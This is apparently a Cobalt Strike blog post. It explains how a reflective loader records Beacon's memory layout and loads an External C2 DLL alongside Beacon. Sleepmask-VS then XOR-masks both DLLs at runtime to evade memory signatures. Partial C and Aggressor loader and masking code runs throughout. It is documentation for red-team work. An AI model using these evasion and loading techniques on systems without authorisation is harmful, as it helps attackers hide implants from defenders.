# https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data

This website uses cookies. You may change your settings at any time.

AcceptReject AllManage Cookies

Cookie Preferences

[Home](https://www.cobaltstrike.com/) » [Blog](https://www.cobaltstrike.com/blog/) » Revisiting the UDRL Part 3: Beacon User Data

# Revisiting the UDRL Part 3: Beacon User Data

Wednesday 04 September, 2024

The UDRL and the Sleepmask are key components of Cobalt Strike’s evasion strategy, yet historically they have not worked well together. For example, prior to [CS 4.10](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate), Beacon statically calculated its location in memory using a combination of its base address and its section table. This calculation was then modified depending on the contents of the user’s malleable C2 profile and passed to the Sleepmask irrespective of the current loader (e.g. default vs UDRL). Therefore, if the UDRL’s loading strategy did not match the malleable C2 settings, the default Sleepmask would either crash or leave parts of Beacon unmasked and susceptible to static signatures.

In CS 4.10, we sought to improve the interface between UDRLs and the Sleepmask and decouple it from the malleable C2 profile. As a result, we updated Beacon User Data (BUD) to include information about memory allocated by the loader. This means Beacon can pass accurate section information to the Sleepmask, at runtime, which ensures that it is masked correctly and removes the need for static calculations/heuristics. In addition, it also makes it possible to track arbitrary memory allocations that can be used for things like BOFs/Sleepmasks/additional Postex capabilities.

The primary intention of this post is to demonstrate the UDRL’s role in runtime masking and show how Cobalt Strike’s two most important evasion tools interact. We will first demonstrate how to track Beacon with BUD. We will then load an External C2 DLL at the same time as Beacon and mask both DLLs at runtime with Sleepmask-VS. For simplicity, we will not cover [masking the Sleepmask itself](https://www.cobaltstrike.com/blog/introducing-the-mutator-kit-creating-object-file-monstrosities-with-sleep-mask-and-llvm).

To accompany this post, we have added the extc2-loader example to [UDRL-VS](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-1-simplifying-development) and `ExternalC2Sleep()` to [Sleepmask-VS](https://github.com/Cobalt-Strike/sleepmask-vs/). It is therefore important to ensure that both tools are compiled and loaded into Cobalt Strike to utilize all the functionality described here.

**_Note:_** _UDRL-VS has been tested on Visual Studio Community version `17.11.2` and Windows 10 SDK `10.0.22000.0`. Please make sure to use the correct Windows 10 SDK as we have noticed some recent MSVC changes which can impact the project._

## Beacon User Data

Beacon User Data (BUD) was originally introduced in [CS 4.9](https://www.cobaltstrike.com/blog/cobalt-strike-49-take-me-to-your-loader) to create a mechanism to pass information between a UDRL and Beacon. Initially, it was intended to let users resolve their own syscall information to avoid using Beacon’s default methods of resolution. However, we see this feature becoming an essential part of UDRL development moving forward.

In CS 4.10, we updated BUD so that users could track the memory allocated by their UDRLs. This functionality was primarily introduced to:

- Ensure the Sleepmask has accurate information about the memory it needs to mask.
- Support the cleanup of the allocated memory.

To fulfill these requirements, BUD follows [Microsoft’s abstractions](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information) around virtual memory and tracks both the initial allocation to facilitate cleanup and any sections within it to support masking. We refer to these as “ _regions_” and “ _sections_” and use the following `ALLOCATED_MEMORY`, `ALLOCATED_MEMORY_REGION` and `ALLOCATED_MEMORY_SECTION` structures to define them.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `typedef``struct``_ALLOCATED_MEMORY_SECTION {` |

|     |     |
| --- | --- |
| `2` | ```ALLOCATED_MEMORY_LABEL Label;` |

|     |     |
| --- | --- |
| `3` | ```PVOID``BaseAddress;` |

|     |     |
| --- | --- |
| `4` | ```SIZE_T``VirtualSize;` |

|     |     |
| --- | --- |
| `5` | ```DWORD``CurrentProtect;` |

|     |     |
| --- | --- |
| `6` | ```DWORD``PreviousProtect;` |

|     |     |
| --- | --- |
| `7` | ```BOOL``MaskSection;` |

|     |     |
| --- | --- |
| `8` | `} ALLOCATED_MEMORY_SECTION, *PALLOCATED_MEMORY_SECTION;` |

|     |     |
| --- | --- |
| `9` |  |

|     |     |
| --- | --- |
| `10` | `typedef``struct``_ALLOCATED_MEMORY_REGION {` |

|     |     |
| --- | --- |
| `11` | ```ALLOCATED_MEMORY_PURPOSE Purpose;` |

|     |     |
| --- | --- |
| `12` | ```PVOID``AllocationBase;` |

|     |     |
| --- | --- |
| `13` | ```SIZE_T``RegionSize;` |

|     |     |
| --- | --- |
| `14` | ```DWORD``Type;` |

|     |     |
| --- | --- |
| `15` | ```ALLOCATED_MEMORY_SECTION Sections[8];` |

|     |     |
| --- | --- |
| `16` | ```ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation;` |

|     |     |
| --- | --- |
| `17` | `} ALLOCATED_MEMORY_REGION, *PALLOCATED_MEMORY_REGION;` |

|     |     |
| --- | --- |
| `18` |  |

|     |     |
| --- | --- |
| `19` | `typedef``struct``{` |

|     |     |
| --- | --- |
| `20` | ```ALLOCATED_MEMORY_REGION AllocatedMemoryRegions[6];` |

|     |     |
| --- | --- |
| `21` | `} ALLOCATED_MEMORY, *PALLOCATED_MEMORY;` |

_**Note:** The `ALLOCATED_MEMORY` structure encompasses six independent `ALLOCATED_MEMORY_REGION`s. These can then be broken down into eight individual `ALLOCATED_MEMORY_SECTION`s._

To simplify this approach to tracking memory, we have provided some helper functions in the UDRL-VS library. These functions abstract some of the details, but can easily be replaced with custom implementations as required.

- `TrackAllocatedMemoryRegion()` – track an initial allocation of memory.
- `TrackAllocatedMemorySection()` – track a section within an existing region.
- `TrackAllocatedMemoryBuffer()` – a wrapper around `TrackAllocatedMemoryRegion()` and `TrackAllocatedMemorySection()`.

In the following code example, we allocate a “ _region_” of memory for the loaded Beacon (via `VirtualAlloc()`). We then initialize the relevant structures and use `TrackAllocatedMemoryRegion()` to save the information to BUD.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `// Initialize the relevant Beacon User Data structures` |

|     |     |
| --- | --- |
| `2` | `USER_DATA userData;` |

|     |     |
| --- | --- |
| `3` | `ALLOCATED_MEMORY allocatedMemory;` |

|     |     |
| --- | --- |
| `4` | `_memset(&userData, 0,``sizeof``(USER_DATA));` |

|     |     |
| --- | --- |
| `5` | `_memset(&allocatedMemory, 0,``sizeof``(ALLOCATED_MEMORY));` |

|     |     |
| --- | --- |
| `6` | `userData.allocatedMemory = &allocatedMemory;` |

|     |     |
| --- | --- |
| `7` | `userData.version = COBALT_STRIKE_VERSION;` |

|     |     |
| --- | --- |
| `8` |  |

|     |     |
| --- | --- |
| `9` | `// Allocate region of memory for the loaded Beacon image` |

|     |     |
| --- | --- |
| `10` | `ULONG_PTR``loadedDllBaseAddress = (``ULONG_PTR``)winApi.VirtualAlloc(NULL, loadedImageSize, MEM_RESERVE | MEM_COMMIT, memoryProtection);` |

|     |     |
| --- | --- |
| `11` |  |

|     |     |
| --- | --- |
| `12` | `[...SNIP...]` |

|     |     |
| --- | --- |
| `13` |  |

|     |     |
| --- | --- |
| `14` | `// Save the memory information in the first region entry` |

|     |     |
| --- | --- |
| `15` | `TrackAllocatedMemoryRegion(&userData.allocatedMemory->AllocatedMemoryRegions[0], PURPOSE_BEACON_MEMORY, (``PVOID``)loadedDllBaseAddress, loadedImageSize, memoryType, &cleanupMemoryInformation);` |

It is also important to track each PE section independently as this information is required by the Sleepmask. To simplify this process, we have added the following `CopyPESectionsAndTrackMemory()` function to the UDRL-VS library. It is a slightly modified version of the existing `CopyPESections()` function, however, it uses `TrackAllocatedMemorySection()` to automatically save the section information.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `BOOL``CopyPESectionsAndTrackMemory(PALLOCATED_MEMORY_REGION allocatedMemoryRegion,``ULONG_PTR``srcImage, PIMAGE_NT_HEADERS ntHeader,``ULONG_PTR``dstAddress,``DWORD``memoryProtections, ALLOCATED_MEMORY_MASK_MEMORY_BOOL mask, COPY_PEHEADER copyPeHeader) {` |

|     |     |
| --- | --- |
| `2` | ```PRINT(``"[+] Copying Sections...\n"``);` |

|     |     |
| --- | --- |
| `3` | `` |

|     |     |
| --- | --- |
| `4` | ```[...SNIP...]` |

|     |     |
| --- | --- |
| `5` |  |

|     |     |
| --- | --- |
| `6` | ```while``(numberOfSections--) {` |

|     |     |
| --- | --- |
| `7` | ```// dstSection is the VA for this section` |

|     |     |
| --- | --- |
| `8` | ```PBYTE``dstSection = (``PBYTE``)dstAddress + sectionHeader->VirtualAddress;` |

|     |     |
| --- | --- |
| `9` |  |

|     |     |
| --- | --- |
| `10` | ```// srcSection is the VA for this sections data` |

|     |     |
| --- | --- |
| `11` | ```PBYTE``srcSection = (``PBYTE``)srcImage + sectionHeader->PointerToRawData;` |

|     |     |
| --- | --- |
| `12` |  |

|     |     |
| --- | --- |
| `13` | ```// Copy the section over` |

|     |     |
| --- | --- |
| `14` | ```DWORD``sizeOfData = sectionHeader->SizeOfRawData;` |

|     |     |
| --- | --- |
| `15` | ```if``(!_memcpy(dstSection, srcSection, sizeOfData)) {` |

|     |     |
| --- | --- |
| `16` | ```return``FALSE;` |

|     |     |
| --- | --- |
| `17` | ```}` |

|     |     |
| --- | --- |
| `18` | `` |

|     |     |
| --- | --- |
| `19` | ```// Save the relevant information to the ALLOCATED_MEMORY_SECTION entry` |

|     |     |
| --- | --- |
| `20` | ```TrackAllocatedMemorySection(&allocatedMemoryRegion->Sections[sectionCount], GetSectionLabelFromName(sectionHeader->Name), dstSection, sectionHeader->Misc.VirtualSize, memoryProtections, mask);` |

|     |     |
| --- | --- |
| `21` |  |

|     |     |
| --- | --- |
| `22` | ```PRINT(``"\t[+] Copied Section: %s\n"``, sectionHeader->Name);` |

|     |     |
| --- | --- |
| `23` |  |

|     |     |
| --- | --- |
| `24` | ```// Get the VA of the next section` |

|     |     |
| --- | --- |
| `25` | ```sectionHeader++;` |

|     |     |
| --- | --- |
| `26` | ```sectionCount++;` |

|     |     |
| --- | --- |
| `27` | ```}` |

|     |     |
| --- | --- |
| `28` | ```return``TRUE;` |

|     |     |
| --- | --- |
| `29` | `}` |

To pass the completed `USER_DATA` structure to Beacon, we simply add an additional call to `DllMain()` to our loader with the `ul_reason_for_call` set to `DLL_BEACON_USER_DATA`.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `((DLLMAIN)entryPoint)(0, DLL_BEACON_USER_DATA, &userData);` |

**_Note:_** _Beacon copies this information locally so that the BUD structures do not need to remain in memory_.

And that’s it! Once Beacon is up and running, it will operate in the same fashion as before. However, when it is time to use the Sleepmask, it will have a much more accurate picture of the loaded Beacon image. The Sleepmask will then take the information in BUD and use it to apply runtime masking.

This approach allows users to create more generic masking capabilities that can automatically handle different memory layouts. For example, the obfuscation-loader uses a custom PE header which means the original is not present in the loaded image. Previously, this missing PE header would have required changing the Sleepmask code to avoid a crash. However, BUD makes it possible to record this information at load time.

## Case Study: BUD vs External C2

Now that we have covered the basics, we can demonstrate how to use BUD to track an additional memory allocation. In the following sections, we will load an External C2 DLL at the same time as Beacon and mask them both at runtime with Sleepmask-VS.

Raphael Mudge [originally introduced External C2 in November 2016](https://www.cobaltstrike.com/blog/kits-profiles-and-scripts-oh-my) to allow operators to create custom command and control channels. Whilst this feature was never announced as part of a release, there are several public projects that are [built on top of External C2](https://www.outflank.nl/blog/2017/09/17/blogpost-cobalt-strike-over-external-c2-beacon-home-in-the-most-obscure-ways/), most notably [C3](https://labs.withsecure.com/tools/c3), which provides a complete framework for creating custom C2 channels.

At a high-level, External C2 is a specification that allows third-party programs to act as a communication layer for Cobalt Strike’s Beacon payload. In practice, this means using an SMB Beacon to communicate with a third-party client over a named pipe. The third-party client then communicates with a third-party controller, which interacts with Cobalt Strike’s External C2 server. This specification makes it possible to tunnel Beacon traffic over any service that allows you to read/write data.

As part of the original implementation, External C2 required the third-party controller to request a stage from the External C2 server before it could begin sending/receiving data. In addition, this stage was provided by the team server which meant that whilst the transformations in the malleable C2 profile were applied, it was not possible to use Aggressor Script to apply UDRLs/Sleepmasks/custom obfuscation and masking.

In CS 4.10, we added a “ _pass thru_” mode to External C2 that allows the third-party controller to begin sending/receiving data immediately without requesting a stage. As a result, it is now possible to export an SMB Beacon from the CS client and use it in combination with a third-party client/controller to connect to the team server. This provides a higher degree of flexibility as it makes it possible to create a single payload file that contains both Beacon and an External C2 channel. In addition, it makes it possible to use Aggressor Script to transform the exported payload.

### Introducing extc2-loader

We have added an extc2-loader example to UDRL-VS. In the extc2-loader folder there are two projects: the first is extc2-dll which ports Raphael’s [original External C2 example](https://hstechdocs.helpsystems.com/kbfiles/cobaltstrike/attachments/extc2example.c) to a DLL and the second is the extc2-loader.

The extc2-loader is a simple reflective loader that abstracts most of its functionality into a separate function (`ExternalC2LoaderLoadDll()`) so it can be called multiple times to load each DLL. It is a Double Pulsar/sRDI style reflective loader which means that it is prepended in front of a single payload file. To ensure that the loader can easily identify the two DLLs, the extc2-loader’s `prepend-udrl.cna` creates a payload consisting of the loader, the size of Beacon, Beacon and the External C2 DLL.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `# Pack the raw size of Beacon to simplify the loader` |

|     |     |
| --- | --- |
| `2` | `$raw_size_of_beacon``=``pack``(``"I-"``, strlen(``$beacon``));` |

|     |     |
| --- | --- |
| `3` |  |

|     |     |
| --- | --- |
| `4` | `# Create the payload` |

|     |     |
| --- | --- |
| `5` | `$payload``=``$ldr``.``$raw_size_of_beacon``.``$beacon``.``$extc2_dll``;` |

This approach makes it possible for the extc2-loader to determine the base address of Beacon and use its length to find the base address of the raw External C2 DLL as well.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `// Find the base address of the payload file` |

|     |     |
| --- | --- |
| `2` | `ULONG_PTR``rawBeaconDllBaseAddress = FindBufferBaseAddress();` |

|     |     |
| --- | --- |
| `3` |  |

|     |     |
| --- | --- |
| `4` | `// Read the size of Beacon` |

|     |     |
| --- | --- |
| `5` | `rawSizeOfBeacon = *(``DWORD``*)rawBeaconDllBaseAddress;` |

|     |     |
| --- | --- |
| `6` |  |

|     |     |
| --- | --- |
| `7` | `// Find the start of the Beacon DLL` |

|     |     |
| --- | --- |
| `8` | `rawBeaconDllBaseAddress +=``sizeof``(``DWORD``);` |

|     |     |
| --- | --- |
| `9` |  |

|     |     |
| --- | --- |
| `10` | `// Find the start of the External C2 DLL` |

|     |     |
| --- | --- |
| `11` | `ULONG_PTR``rawExtC2DllBaseAddress = rawBeaconDllBaseAddress + rawSizeOfBeacon;` |

Once it has located the base address of each DLL, it can then load them independently via consecutive calls to `ExternalC2LoaderLoadDll()`.  As part of this process, it also tracks the memory and passes the information to Beacon via BUD.

**_Note:_** _To easily differentiate between these two regions of memory, we set the purpose field of Beacon’s region to `PURPOSE_BEACON_MEMORY` and the purpose of the External C2 DLL to an arbitrary value of 2000 to demonstrate using a custom `ALLOCATED_MEMORY_PURPOSE` value. This makes it possible to easily identify the region of memory in the Sleepmask._

To launch the capability, we call the External C2 DLL’s entry point to initialize the CRT and ensure that its startup routines have finished. We then resolve its exported `go()` function and pass it to `CreateThread()` along with a pointer to BUD’s custom data field. We then call Beacon’s entry point to do the same initialization, pass it a pointer to the `USER_DATA` structure and start Beacon.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `((DLLMAIN)extC2.EntryPoint)((``HINSTANCE``)extC2.LoadedBaseAddress, DLL_PROCESS_ATTACH, NULL);` |

|     |     |
| --- | --- |
| `2` |  |

|     |     |
| --- | --- |
| `3` | `constexpr``DWORD``GO_HASH = CompileTimeHash(``"go"``);` |

|     |     |
| --- | --- |
| `4` |  |

|     |     |
| --- | --- |
| `5` | `ULONG_PTR``extC2Go = ExtC2LoaderFindExportedFunctionByHash(extC2.LoadedBaseAddress, GO_HASH);` |

|     |     |
| --- | --- |
| `6` |  |

|     |     |
| --- | --- |
| `7` | `winApi.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)extC2Go, &userData.custom, 0, NULL);` |

|     |     |
| --- | --- |
| `8` |  |

|     |     |
| --- | --- |
| `9` | `winApi.Sleep(1000);` |

|     |     |
| --- | --- |
| `10` |  |

|     |     |
| --- | --- |
| `11` | `((DLLMAIN)beacon.EntryPoint)(0, DLL_BEACON_USER_DATA, &userData);` |

|     |     |
| --- | --- |
| `12` |  |

|     |     |
| --- | --- |
| `13` | `((DLLMAIN)beacon.EntryPoint)((``HINSTANCE``)beacon.LoadedBaseAddress, DLL_PROCESS_ATTACH, NULL);` |

|     |     |
| --- | --- |
| `14` |  |

|     |     |
| --- | --- |
| `15` | `((DLLMAIN)beacon.EntryPoint)((``HINSTANCE``)loaderStart, 0x4, NULL);` |

### Runtime Masking

To reliably apply runtime masking, we had to find a way to synchronize the threads to ensure that they “Sleep” at the same time. It is safe to mask Beacon when execution reaches the Sleepmask as the thread is no longer executing the Beacon code. However, this is not true for the External C2 DLL which is either waiting for the External C2 server to send data or waiting for Beacon to send it.

To overcome this, we modified Raphael’s original External C2 example to use non-blocking calls when reading data from the pipe/socket. This “ _non-blocking_” approach means the External C2 DLL can check if data is available instead of waiting for something to arrive. For example, the following `ReadFrameFromBeaconPipe()` function uses `PeekNamedPipe()` to check for data.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `int``ReadFrameFromBeaconPipe(``HANDLE``pipeHandle,``char``* buffer) {` |

|     |     |
| --- | --- |
| `2` | ```DWORD``size = 0, temp = 0, total = 0;` |

|     |     |
| --- | --- |
| `3` | ```DWORD``totalBytesAvailable = 0;` |

|     |     |
| --- | --- |
| `4` |  |

|     |     |
| --- | --- |
| `5` | ```// Check if there's data on the pipe` |

|     |     |
| --- | --- |
| `6` | ```if``(!PeekNamedPipe(pipeHandle, NULL, 0, NULL, &totalBytesAvailable, NULL)) {` |

|     |     |
| --- | --- |
| `7` | ```return``EXTC2PIPE_READ_ERROR;` |

|     |     |
| --- | --- |
| `8` | ```}` |

|     |     |
| --- | --- |
| `9` | ```if``(totalBytesAvailable == 0) {` |

|     |     |
| --- | --- |
| `10` | ```// If no data is available, return to avoid waiting` |

|     |     |
| --- | --- |
| `11` | ```return``NO_DATA_AVAILABLE;` |

|     |     |
| --- | --- |
| `12` | ```}` |

|     |     |
| --- | --- |
| `13` |  |

|     |     |
| --- | --- |
| `14` | ```// Read the length of the buffer` |

|     |     |
| --- | --- |
| `15` | ```if``(!ReadFile(pipeHandle, (``char``*)&size, 4, &temp, NULL)) {` |

|     |     |
| --- | --- |
| `16` | ```return``EXTC2PIPE_READ_ERROR;` |

|     |     |
| --- | --- |
| `17` | ```}` |

|     |     |
| --- | --- |
| `18` |  |

|     |     |
| --- | --- |
| `19` | ```// Read the buffer` |

|     |     |
| --- | --- |
| `20` | ```while``(total < size) {` |

|     |     |
| --- | --- |
| `21` | ```if``(!ReadFile(pipeHandle, buffer + total, size - total, &temp, NULL)) {` |

|     |     |
| --- | --- |
| `22` | ```return``EXTC2PIPE_READ_ERROR;` |

|     |     |
| --- | --- |
| `23` | ```}` |

|     |     |
| --- | --- |
| `24` | ```total += temp;` |

|     |     |
| --- | --- |
| `25` | ```}` |

|     |     |
| --- | --- |
| `26` |  |

|     |     |
| --- | --- |
| `27` | ```return``size;` |

|     |     |
| --- | --- |
| `28` | `}` |

The extc2-loader also creates four anonymous event objects. A handle to each event is then saved to BUD’s custom data field and passed to the External C2 DLL’s `go()` function when the thread is created. This makes it possible to retrieve the same information from within the Sleepmask via `BeaconGetCustomUserData()`.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `((PEXTC2_SYNC_INFO)userData.custom)->ExtC2Init = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);` |

|     |     |
| --- | --- |
| `2` | `if``(((PEXTC2_SYNC_INFO)userData.custom)->ExtC2Init == NULL) {` |

|     |     |
| --- | --- |
| `3` | ```PRINT(``"[*] Failed to create event. Exiting...\n"``);` |

|     |     |
| --- | --- |
| `4` | ```return``NULL;` |

|     |     |
| --- | --- |
| `5` | `}` |

|     |     |
| --- | --- |
| `6` | `((PEXTC2_SYNC_INFO)userData.custom)->ExtC2StopEvent = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);` |

|     |     |
| --- | --- |
| `7` | `if``(((PEXTC2_SYNC_INFO)userData.custom)->ExtC2StopEvent == NULL) {` |

|     |     |
| --- | --- |
| `8` | ```PRINT(``"[*] Failed to create event. Exiting...\n"``);` |

|     |     |
| --- | --- |
| `9` | ```return``NULL;` |

|     |     |
| --- | --- |
| `10` | `}` |

|     |     |
| --- | --- |
| `11` | `((PEXTC2_SYNC_INFO)userData.custom)->ExtC2SleepEvent = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);` |

|     |     |
| --- | --- |
| `12` | `if``(((PEXTC2_SYNC_INFO)userData.custom)->ExtC2SleepEvent == NULL) {` |

|     |     |
| --- | --- |
| `13` | ```PRINT(``"[*] Failed to create event. Exiting...\n"``);` |

|     |     |
| --- | --- |
| `14` | ```return``NULL;` |

|     |     |
| --- | --- |
| `15` | `}` |

|     |     |
| --- | --- |
| `16` | `((PEXTC2_SYNC_INFO)userData.custom)->ExtC2ContinueEvent = winApi.CreateEventA(NULL, FALSE, FALSE, NULL);` |

|     |     |
| --- | --- |
| `17` | `if``(((PEXTC2_SYNC_INFO)userData.custom)->ExtC2ContinueEvent == NULL) {` |

|     |     |
| --- | --- |
| `18` | ```PRINT(``"[*] Failed to create event. Exiting...\n"``);` |

|     |     |
| --- | --- |
| `19` | ```return``NULL;` |

|     |     |
| --- | --- |
| `20` | `}` |

|     |     |
| --- | --- |
| `21` | `PRINT(``"[*] Created event objects\n"``);` |

The purpose of each of these events has been described below:

- `ExtC2InitEvent` – used by Sleepmask-VS to check whether the External C2 DLL is operational.
- `ExtC2StopEvent` – used by Sleepmask-VS to indicate when the External C2 DLL should wait.
- `ExtC2SleepEvent` – used by the External C2 DLL to indicate when it is waiting.
- `ExtC2ContinueEvent` – used by Sleepmask-VS to indicate that the External C2 DLL can continue execution.

These events are then used as part of the External C2 DLL’s busy loop to:

- Check whether Sleepmask-VS has set the `ExtC2StopEvent`.
- Signal that the External C2 DLL’s thread is waiting (`ExtC2SleepEvent`).
- Wait for Sleepmask-VS to signal the `ExtC2ContinueEvent`.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `while``(TRUE) {` |

|     |     |
| --- | --- |
| `2` | ```/**` |

|     |     |
| --- | --- |
| `3` | ```* Check whether the Sleepmask has signaled the stop event.` |

|     |     |
| --- | --- |
| `4` | ```* If the stop event is not signaled, continue immediately...` |

|     |     |
| --- | --- |
| `5` | ```*/` |

|     |     |
| --- | --- |
| `6` | ```if``(WaitForSingleObject(localExtC2Info.ExtC2StopEvent, 0) == WAIT_OBJECT_0) {` |

|     |     |
| --- | --- |
| `7` | ```/**` |

|     |     |
| --- | --- |
| `8` | ```* Let the Sleepmask know this thread is sleeping and` |

|     |     |
| --- | --- |
| `9` | ```* wait for the Sleepmask to signal the Continue event.` |

|     |     |
| --- | --- |
| `10` | ```*` |

|     |     |
| --- | --- |
| `11` | ```* Note: This allows the Sleepmask to mask the External C2 Dll` |

|     |     |
| --- | --- |
| `12` | ```*/` |

|     |     |
| --- | --- |
| `13` | ```SignalObjectAndWait(localExtC2Info.ExtC2SleepEvent, localExtC2Info.ExtC2ContinueEvent, INFINITE, FALSE);` |

|     |     |
| --- | --- |
| `14` | ```}` |

|     |     |
| --- | --- |
| `15` |  |

|     |     |
| --- | --- |
| `16` | ```[...SNIP...]` |

|     |     |
| --- | --- |
| `17` | `}` |

This approach puts Sleepmask-VS in the driving seat. It can mask Beacon and then use the event objects created by the loader to synchronize the threads. In the below example, Sleepmask-VS:

- Sets `ExtC2StopEvent` to instruct the External C2 DLL to wait.
- Waits for the External C2 DLL to signal that it has entered a waiting state (`ExtC2SleepEvent`).
- Masks the External C2 DLL’s PE sections.
- Sleeps for three seconds.
- Unmasks the External C2 DLL’s PE sections.
- Signals `ExtC2ContinueEvent` to let the External C2 DLL continue execution.

[view source](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#viewSource "view source")

[print](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#printSource "print") [?](https://www.cobaltstrike.com/blog/revisiting-the-udrl-part-3-beacon-user-data#about "?")

|     |     |
| --- | --- |
| `1` | `void``ExternalC2Sleep(PSLEEPMASK_INFO info, PCUSTOM_USER_DATA customUserData) {` |

|     |     |
| --- | --- |
| `2` | ```[...SNIP...]` |

|     |     |
| --- | --- |
| `3` |  |

|     |     |
| --- | --- |
| `4` | ```// Signal External C2 DLL to wait` |

|     |     |
| --- | --- |
| `5` | ```DLOGF(``"SLEEPMASK: ExtC2Sleep - Set Stop event\n"``);` |

|     |     |
| --- | --- |
| `6` | ```SetEvent(((PEXTC2_SYNC_INFO)customUserData)->ExtC2StopEvent);` |

|     |     |
| --- | --- |
| `7` |  |

|     |     |
| --- | --- |
| `8` | ```[...SNIP...]` |

|     |     |
| --- | --- |
| `9` | ```DLOGF(``"SLEEPMASK: ExtC2Sleep - Waiting for External C2 thread to sleep...\n"``);` |

|     |     |
| --- | --- |
| `10` | ```DWORD``waitStatus = WaitForSingleObject(((PEXTC2_SYNC_INFO)customUserData)->ExtC2SleepEvent, 30000);` |

|     |     |
| --- | --- |
| `11` | ```if``(waitStatus == WAIT_OBJECT_0) {` |

|     |     |
| --- | --- |
| `12` | ```DLOGF(``"SLEEPMASK: ExtC2Sleep - External C2 thread sleeping\n"``);` |

|     |     |
| --- | --- |
| `13` |  |

|     |     |
| --- | --- |
| `14` | ```/*` |

|     |     |
| --- | --- |
| `15` | ```* A small sleep before masking to ensure the External C2 thread` |

|     |     |
| --- | --- |
| `16` | ```* is in the waiting state.` |

|     |     |
| --- | --- |
| `17` | ```*/` |

|     |     |
| --- | --- |
| `18` | ```Sleep(500);` |

|     |     |
| --- | --- |
| `19` |  |

|     |     |
| --- | --- |
| `20` | ```// Mask External C2 DLL` |

|     |     |
| --- | --- |
| `21` | ```DLOGF(``"SLEEPMASK: ExtC2Sleep - Masking... \n"``);` |

|     |     |
| --- | --- |
| `22` | ```XORSections(extC2Memory, info->beacon_info.mask, TRUE);` |

|     |     |
| --- | --- |
| `23` |  |

|     |     |
| --- | --- |
| `24` | ```// Sleep` |

|     |     |
| --- | --- |
| `25` | ```Sleep(3000);` |

|     |     |
| --- | --- |
| `26` |  |

|     |     |
| --- | --- |
| `27` | ```// UnMask External C2 DLL` |

|     |     |
| --- | --- |
| `28` | ```DLOGF(``"SLEEPMASK: ExtC2Sleep - Unmasking... \n"``);` |

|     |     |
| --- | --- |
| `29` | ```XORSections(extC2Memory, info->beacon_info.mask, FALSE);` |

|     |     |
| --- | --- |
| `30` |  |

|     |     |
| --- | --- |
| `31` | ```DLOGF(``"SLEEPMASK: ExtC2Sleep - Set Continue event\n"``);` |

|     |     |
| --- | --- |
| `32` | ```SetEvent(((PEXTC2_SYNC_INFO)customUserData)->ExtC2ContinueEvent);` |

|     |     |
| --- | --- |
| `33` | ```}` |

|     |     |
| --- | --- |
| `34` | ```[...SNIP...]` |

|     |     |
| --- | --- |
| `35` | ```return``;` |

|     |     |
| --- | --- |
| `36` | `}` |

